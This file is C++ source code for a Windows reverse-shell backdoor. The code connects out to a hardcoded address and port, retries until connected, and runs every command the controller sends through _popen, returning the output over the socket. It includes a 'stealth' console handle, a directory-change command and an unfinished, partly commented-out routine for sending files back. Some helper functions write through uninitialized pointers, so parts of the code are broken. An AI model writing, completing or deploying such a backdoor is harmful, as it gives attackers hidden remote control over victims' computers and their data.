
#ifdef _WIN32
#include <Windows.h>
#else
#include <unistd.h>
#endif
#include <iostream>
#include <fstream>
#include <WS2tcpip.h>
#include <unistd.h>
#include <cstdlib>

#pragma comment(lib, "ws2_32.lib")
using namespace std;

#define DEFAULT_BUFLEN 40690
#define DEFAULT_TOTALE_BUFLEN 651040
#define DEFAULT_PORT 27015

int sock;

int strincludes(char *strVar, char *buffer);
char *strsub(char str[], int slice_from, int slice_to);

void download_file(char *filename);

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR pCmdLine, int nCmdShow)
{

    HWND stealth;

    AllocConsole();

    stealth = FindWindowA("ConsoleWindowClass", NULL);

    ShowWindow(stealth, 1);

    sockaddr_in ServAdrr;
    // unsigned short ServPort = DEFAULT_PORT;
    char ServIp[16] = "192.168.1.36";

    WSADATA wsaData;

    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
    {
        exit(1);
    }
tryc:
    sock = socket(AF_INET, SOCK_STREAM, 0);

    ZeroMemory(&ServAdrr, sizeof(ServAdrr));
    ServAdrr.sin_family = AF_INET;
    ServAdrr.sin_addr.S_un.S_addr = inet_addr(ServIp);
    ServAdrr.sin_port = htons(DEFAULT_PORT);

    // cout << "[+] - " << ServAdrr.sin_addr.S_un.S_addr << endl;

start:
    int resCon = connect(sock, (struct sockaddr *)&ServAdrr, sizeof(ServAdrr));
    while (resCon != 0)
    {
        sleep(10);
        cout << "Try to connection " << endl;
        goto start;
    }
    if (resCon == 0)
    {
        printf("[+] - Connected ^_^\n");
    }

    char buffer[DEFAULT_BUFLEN];
    char container[DEFAULT_BUFLEN];
    char total_response[DEFAULT_TOTALE_BUFLEN];

    cout << "[RECV]" << endl;

    while (true)
    {
    jumb:
        ZeroMemory(buffer, sizeof(buffer));
        ZeroMemory(container, sizeof(container));
        ZeroMemory(total_response, sizeof(total_response));

        // int bytesRecv = recv(sock, buffer, sizeof(buffer), 0);
        int bytesRecv = recv(sock, buffer, sizeof(buffer), 0);

        cout << "[CMD] -> " << buffer << endl;

        if (bytesRecv == SOCKET_ERROR)
        {
            cerr << "[ERR] - Error in recv() ! . Quitting" << endl;
            goto tryc;
        }

        if (bytesRecv == 0)
        {
            cout << "[ERR] - Server disconnected " << endl;
            goto tryc;
        }

        cout << "[CMD] -> " << buffer << endl;

        if (strncmp("q", buffer, 1) == 0)
        {
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        else if (strncmp("cd ", buffer, 3) == 0)
        {
            chdir(strsub(buffer, 3, 100));
            // strcpy(total_response, strsub(buffer, 3, 100));
            send(sock, total_response, sizeof(total_response), 0);
        }
        else if (strncmp("download ", buffer, 9) == 0)
        {
            char *filename = strsub(buffer, 9, 100);
            // if (!filename) {

            // }
            // "@download ->> file:filename.c; fdddddgfdgffddddddddddddhfghgf"
        }

        else
        {

            FILE *fp;
            fp = _popen(buffer, "rt");
            while (fgets(container, 4096, fp))
            {
                strcat(total_response, container);
            }
            if (feof(fp))
            {

                printf("[TRES] -> %s\n", total_response);
                send(sock, total_response, sizeof(total_response), 0);

                _pclose(fp);
            }
        }
    }
}

// void download_file(char *filename)
// {

//     char lineData[DEFAULT_BUFLEN];
//     char fileData[DEFAULT_TOTALE_BUFLEN];
//     char response_err[DEFAULT_TOTALE_BUFLEN];

//     if (!filename)
//     {
//         strcpy(response_err, "please input valid filename");
//         send(sock, response_err, sizeof(response_err), 0);
//         return;
//     }

//     fstream fp;
//     fp.open(filename, ios::in);

//     while (fp >> lineData)
//     {
//         strcat(fileData, lineData);
//     }

//     send(sock, fileData, sizeof(fileData), 0);

//     return;
// }

int strincludes(char *strVar, char *buffer)
{
    char *str;
    strcpy(str, strVar);
    if (!str)
        return 0;

    //  char *buffer_len = strlen(buffer);

    char *token = strtok(str, " ");
    while (token != NULL)
    {
        printf("%s --- %s\n", buffer, token);
        if (strcmp(buffer, token) == 0)
        {
            return 1;
        }
        token = strtok(NULL, " ");
    }
    return 0;
}

char *strsub(char str[], int slice_from, int slice_to)
{
    if (!str[slice_from + 1])
    {
        return NULL;
    }

    char *buffer;
    size_t str_len, buffer_len;
    if (slice_to < 0 && slice_from > slice_to)
    {
        str_len = strlen(str);
        if (abs(slice_to) > str_len - 1)
        {
            return NULL;
        }

        if (abs(slice_from) > str_len)
        {
            return NULL;
        }

        buffer_len = slice_to - slice_from;
        str += (str_len + slice_from);
    }
    else if (slice_from >= 0 && slice_to > slice_from)
    {
        str_len = strlen(str);

        if (slice_from > str_len - 1)
        {
            return NULL;
        }

        buffer_len = slice_to - slice_from;
        str += slice_from;
    }

    // buffer = calloc(buffer_len, sizeof(char));
    strncpy(buffer, str, buffer_len);
    return buffer;
}
